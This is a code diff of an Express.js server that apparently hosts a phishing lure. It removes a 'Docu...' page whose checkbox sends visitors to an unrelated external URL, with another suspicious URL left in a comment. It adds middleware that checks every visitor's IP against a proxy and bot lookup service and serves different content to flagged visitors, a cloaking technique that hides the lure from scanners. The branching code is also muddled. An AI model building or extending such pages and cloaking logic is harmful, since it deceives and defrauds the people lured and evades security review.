@@ -1,10 +1,24 @@
 const express = require('express');
+const axios = require('axios');
 const app = express();
 const port = 3020;
 
-app.get('/', (req, res) => {
-    res.send(`
-        <!DOCTYPE html>
+// Middleware to check IP against the IP lookup service
+app.use(async (req, res, next) => {
+    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+
+    if (!userIp) {
+        return res.status(403).send('Unable to determine IP address.');
+    }
+
+    try {
+        // Send a request to the IP lookup service
+        const response = await axios.get(`https://blackbox.ipinfo.app/lookup/${userIp}`);
+        console.log(response.data)
+        console.log(userIp)
+        if (response.data.trim() === 'Y') {
+            // If the response is "Y", block the request
+            return res.status(200).send(`<!DOCTYPE html>
 <html lang="en">
 
 <head>
@@ -132,21 +146,43 @@ app.get('/', (req, res) => {
         </div>
     </div>
 
-    <script>
-        function getUrlParameter(name) {
-            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
-            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
-            var results = regex.exec(window.location.search);
-            return results === null ? null : decodeURIComponent(results[1].replace(/\\+/g, ' '));
-        }
+</body>
 
-        // #https://digitalglamourfo.com.de/iS5t/
-
-        function toggleCheck(element) {
-            element.classList.toggle('checked');
-            window.location.href = 'https://sanjeevanifood.in/9c7a1f2e-8a61-4c8b-9c88-ef28b9b3ae1d/'
+</html>`);
         }
-    </script>
+    } catch (error) {
+        console.error('Error checking IP:', error.message);
+        // Allow the request if there's an issue with the lookup service
+        return res.status(500).send('Error verifying IP.');
+    }
+
+    next(); // Proceed to the next middleware or route
+});
+
+app.get('/', (req, res) => {
+    res.send(`
+        <!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Docu...</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Welcome to our site!</h1>
 </body>
 
 </html>
